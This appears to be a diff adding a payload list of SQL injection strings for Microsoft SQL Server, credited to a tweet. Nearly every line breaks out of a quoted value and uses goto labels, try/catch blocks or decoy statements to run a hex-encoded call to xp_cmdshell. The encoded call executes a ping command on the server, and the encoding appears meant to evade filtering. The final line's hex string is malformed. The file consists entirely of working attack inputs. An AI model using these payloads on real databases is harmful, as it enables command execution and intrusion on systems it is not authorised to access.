@@ -1,0 +1,30 @@
+# https://twitter.com/ru_raz0r/status/750311113435283456
+#
+username'exec master..xp_cmdshell'ping 127.0.0.1' -- and password = 'test'
+username'declare @s varchar (8000); ...
+username'DECLARE @find varchar(30) = 'Man%'
+'begin declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s); end	
+'goto label; label: declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'begin try select 1/0 end try begin catch declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end catch--
+'begin try declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end try begin catch print 1 end catch--
+'begin goto label declare @a varchar label: declare @s varchar (8000) set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end
+'begin goto label ALTER DATABASE pubs SET RECOVERY SIMPLE label: declare @s varchar (8000) set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end--
+'begin goto label select 1 label: @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end--
+'begin goto label label: declare @s varchar (8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s); end--
+'goto label label: declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'goto label ALTER DATABASE pubs SET RECOVERY SIMPLE; label: declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'goto label INSERT INTO Production.UnitMeasure (Name, UnitMeasureCode,ModifiedDate) VALUES (N'Square Yards', N'Y2', GETDATE()) label: declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'goto label declare @a label: declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'goto label select cast(@@version as varchar) label: declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'goto label select @@version label: declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'goto label select "a" label: declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'goto label select 1 label: declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'select @@version; declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end--
+'select 'a'; declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end--
+'select 1; declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end--
+'select @@version begin declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end--
+'select 'a' begin declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end--
+'select 1 begin declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s) end--
+'select @@version goto label select 'a' label:declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'select 'a' goto label select 'a' label:declare @s varchar(8000);set @s = cast(0x65786563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
+'select 1 goto label select 'a' label:declare @s varchar(8000);set @s = cast(0x6576563206D61737465722E2E78705F636D647368656C6C202770696E67203137322E31362E392E3627 as varchar(max));exec(@s)--
